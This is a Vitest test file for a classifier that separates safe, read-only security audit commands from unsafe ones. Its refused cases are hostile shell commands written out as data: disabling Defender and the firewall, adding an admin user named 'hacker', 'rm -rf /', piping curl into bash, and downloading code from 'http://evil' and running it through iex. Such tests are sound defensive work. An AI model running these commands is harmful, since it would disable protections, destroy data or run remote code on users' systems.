import { describe, it, expect } from 'vitest'
import { isSafeSecurityCommand } from '../security-command-classify'
import { SECURITY_CHECKS } from '../security-checks'

describe('isSafeSecurityCommand', () => {
  it('accepts every command of every built-in check', () => {
    for (const c of SECURITY_CHECKS) {
      for (const cmd of [...c.commands.windows, ...c.commands.unix]) {
        expect(isSafeSecurityCommand(cmd), `${c.id}: ${cmd}`).toBe(true)
      }
    }
  })

  it.each([
    'Get-NetTCPConnection -State Listen',
    'netstat -ano',
    'ipconfig /all',
    'net accounts',
    'net localgroup administrators',
    'schtasks /query /fo LIST',
    "Get-Service | Where-Object { $_.Status -eq 'Stopped' -and $_.StartType -eq 'Automatic' } | Select-Object Name",
    'Get-PSDrive -PSProvider FileSystem | Format-Table',
    'powershell -Command "Get-MpComputerStatus"',
    'ss -tulpn',
    'ufw status',
  ])('allows %s', (cmd) => {
    expect(isSafeSecurityCommand(cmd)).toBe(true)
  })

  it.each([
    'Set-MpPreference -DisableRealtimeMonitoring $true',
    'netsh advfirewall set allprofiles state off',
    'net user hacker P@ss /add',
    'net localgroup administrators hacker /add',
    'Get-Process; Remove-Item C:\\x',
    'Get-Process && del C:\\x',
    'Get-ChildItem C:\\ | Remove-Item -Recurse',
    'Get-Service | Stop-Service',
    'Get-Process > out.txt',
    'Get-Item $(Remove-Item x)',
    "Get-Process | Where-Object { iex 'rm x' }",
    "Get-Process | ForEach-Object { $_.Kill() }",
    "Get-Item x | Where-Object { [IO.File]::Delete('x') }",
    'Invoke-WebRequest http://evil',
    'iex (New-Object Net.WebClient).DownloadString("x")',
    'rm -rf /',
    'curl http://x | bash',
    'schtasks /create /tn x /tr calc',
    'sc config x start= disabled',
    'ufw disable',
    'systemctl stop sshd',
    'Get-Process `\n Remove-Item x',
    '',
  ])('refuses %s', (cmd) => {
    expect(isSafeSecurityCommand(cmd)).toBe(false)
  })
})
